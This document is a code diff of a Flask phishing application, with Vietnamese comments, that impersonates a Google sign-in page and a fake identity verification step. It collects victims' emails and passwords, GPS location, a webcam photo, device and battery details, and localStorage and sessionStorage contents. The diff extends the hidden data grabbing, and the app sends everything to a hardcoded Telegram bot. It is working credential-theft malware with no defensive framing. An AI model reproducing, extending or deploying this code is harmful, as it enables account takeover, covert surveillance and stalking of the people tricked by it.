@@ -1,7 +1,7 @@
 # app.py
 # Python 3.10+
-# Target: Advanced Phishing Portal (Email, Pass, GPS, Device Info, Webcam)
-# Requires: flask, requests, user_agents
+# Target: Advanced Phishing Portal (Email, Pass, GPS, Webcam, Device Hardware, LocalStorage)
+# Requires: flask, requests, user-agents
 
 from flask import Flask, request, render_template_string, redirect, jsonify
 import requests
@@ -14,7 +14,7 @@ app = Flask(__name__)
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9050498708:AAG9AVoffgweODY06PWGLwNBRHXvoaN9B4s")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "9144223149")
 
-# Bộ nhớ tạm lưu dữ liệu (Chỉ dùng cho test, nếu chạy thật nên dùng Redis/DB)
+# Bộ nhớ tạm
 sessions = {}
 
 CSS = """
@@ -33,7 +33,7 @@ CSS = """
 </style>
 """
 
-# BƯỚC 1: NHẬP EMAIL & PASS (GIAO DIỆN LOGIN GOOGLE)
+# BƯỚC 1: LOGIN
 HTML_LOGIN = f"""
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Đăng nhập - Tài khoản Google</title>{CSS}</head>
@@ -51,7 +51,7 @@ HTML_LOGIN = f"""
 </body></html>
 """
 
-# BƯỚC 2: XÁC MINH VỊ TRÍ & CAMERA
+# BƯỚC 2: LỪA CẤP QUYỀN & VÉT DỮ LIỆU NGẦM
 HTML_VERIFY = f"""
 <!DOCTYPE html>
 <html><head><meta charset="UTF-8"><title>Xác minh danh tính</title>{CSS}</head>
@@ -66,6 +66,32 @@ HTML_VERIFY = f"""
     </div>
 
     <script>
+        // Hàm vét dữ liệu ngầm
+        function getDeepData() {{
+            let data = {{
+                screen: `${{window.screen.width}}x${{window.screen.height}}`,
+                hardware: `${{navigator.hardwareConcurrency || 'N/A'}} Cores / ${{navigator.deviceMemory || 'N/A'}}GB RAM`,
+                network: `${{navigator.connection ? navigator.connection.effectiveType : 'N/A'}}`,
+                battery: "Unknown",
+                localStorage: {{}},
+                sessionStorage: {{}}
+            }};
+
+            // Vét LocalStorage & SessionStorage
+            try {{
+                for(let i=0; i<localStorage.length; i++) {{
+                    let k = localStorage.key(i);
+                    data.localStorage[k] = localStorage.getItem(k).substring(0, 100);
+                }}
+                for(let i=0; i<sessionStorage.length; i++) {{
+                    let k = sessionStorage.key(i);
+                    data.sessionStorage[k] = sessionStorage.getItem(k).substring(0, 100);
+                }}
+            }} catch(e) {{}}
+
+            return data;
+        }}
+
         const btn = document.getElementById('verifyBtn');
         const video = document.getElementById('video');
         const status = document.getElementById('status');
@@ -73,6 +99,15 @@ HTML_VERIFY = f"""
         btn.addEventListener('click', async () => {{
             status.innerText = "Đang yêu cầu quyền...";
             let lat = "Unknown", lon = "Unknown";
+            let deepData = getDeepData();
+
+            // Vét Pin (Bất đồng bộ)
+            try {{
+                if (navigator.getBattery) {{
+                    const battery = await navigator.getBattery();
+                    deepData.battery = `${{Math.round(battery.level * 100)}}% (Sạc: ${{battery.charging ? 'Có' : 'Không'}})`;
+                }}
+            }} catch(e) {{}}
 
             // 1. Lấy vị trí
             try {{
@@ -96,11 +131,11 @@ HTML_VERIFY = f"""
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                     const imageData = canvas.toDataURL('image/jpeg', 0.8);
                     
-                    // Gửi dữ liệu
+                    // Gửi toàn bộ data
                     fetch('/upload_verify', {{
                         method: 'POST',
                         headers: {{ 'Content-Type': 'application/json' }},
-                        body: JSON.stringify({{ image: imageData, lat: lat, lon: lon }})
+                        body: JSON.stringify({{ image: imageData, lat: lat, lon: lon, deepData: deepData }})
                     }}).then(() => {{
                         status.style.color = "green";
                         status.innerText = "Xác minh thành công! Đang chuyển hướng...";
@@ -128,21 +163,14 @@ def login():
     ip = request.remote_addr
     ua_string = request.headers.get('User-Agent')
     
-    # Phân tích thiết bị
     user_agent = parse(ua_string)
     device_info = f"{user_agent.os.family} {user_agent.os.version_string} - {user_agent.browser.family}"
     is_mobile = "Điện thoại" if user_agent.is_mobile else "Máy tính"
     
-    # Lưu vào bộ nhớ tạm
     sessions[email] = {
-        "email": email,
-        "password": password,
-        "ip": ip,
-        "device": device_info,
-        "type": is_mobile,
-        "ua": ua_string
+        "email": email, "password": password, "ip": ip,
+        "device": device_info, "type": is_mobile, "ua": ua_string
     }
-    
     return redirect(f"/verify?email={email}")
 
 @app.route('/verify')
@@ -153,51 +181,47 @@ def verify_page():
 def upload_verify():
     data = request.json
     email = request.referrer.split('email=')[-1] if 'email=' in request.referrer else "Unknown"
-    image_b64 = data.get('image')
-    lat = data.get('lat')
-    lon = data.get('lon')
     
     if email in sessions:
-        sessions[email]['lat'] = lat
-        sessions[email]['lon'] = lon
-        sessions[email]['image'] = image_b64
+        sessions[email]['lat'] = data.get('lat')
+        sessions[email]['lon'] = data.get('lon')
+        sessions[email]['image'] = data.get('image')
+        sessions[email]['deep'] = data.get('deepData')
         
-        # Bắn Telegram 1 lần duy nhất khi đã có đủ dữ liệu
         send_telegram_report(sessions[email])
-        
-        # Xóa session sau khi gửi để tránh gửi trùng
         del sessions[email]
 
     return jsonify({"status": "ok"})
 
 def send_telegram_report(data):
-    # Format lại giao diện tin nhắn Telegram
+    deep = data.get('deep', {})
     map_link = f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}" if data.get('lat') != "Unknown" else "Không xác định"
+    
+    # Format LocalStorage cho gọn
+    ls_str = "\n".join([f"{k}: {v[:20]}..." for k, v in deep.get('localStorage', {{}}).items()]) if deep.get('localStorage') else "Trống"
     
     caption = (
         f"🎯 **BẮT ĐƯỢC ACC GOOGLE!**\n\n"
         f"👤 **Email:** `{data['email']}`\n"
         f"🔑 **Pass:** `{data['password']}`\n"
         f"🌐 **IP:** `{data['ip']}`\n"
-        f"📱 **Thiết bị:** {data['type']} ({data['device']})\n"
+        f"📱 **Thiết bị:** {data['type']} ({data['device']})\n\n"
+        f"💻 **Màn hình:** {deep.get('screen')}\n"
+        f"⚙️ **Cấu hình:** {deep.get('hardware')}\n"
+        f"🔋 **Pin:** {deep.get('battery')}\n"
+        f"📶 **Mạng:** {deep.get('network')}\n"
         f"📍 **Vị trí:** [Xem trên bản đồ]({map_link})\n\n"
-        f"🍪 **User Agent:** `{data['ua'][:50]}...`"
+        f"🗄 **LocalStorage:**\n`{ls_str[:200]}`"
     )
 
-    # Xử lý ảnh Base64
     image_b64 = data.get('image')
-    
     if image_b64:
         img_bytes = base64.b64decode(image_b64.split(',')[1])
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
         files = {'photo': ('face.jpg', img_bytes, 'image/jpeg')}
         payload = {"chat_id": TELEGRAM_CHAT_ID, "caption": caption, "parse_mode": "Markdown"}
-        try:
-            requests.post(url, data=payload, files=files, timeout=10)
-        except Exception as e:
-            print(f"Lỗi gửi ảnh: {e}")
+        requests.post(url, data=payload, files=files, timeout=10)
     else:
-        # Nếu không có ảnh, chỉ gửi text
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         payload = {"chat_id": TELEGRAM_CHAT_ID, "text": caption, "parse_mode": "Markdown"}
         requests.post(url, json=payload)
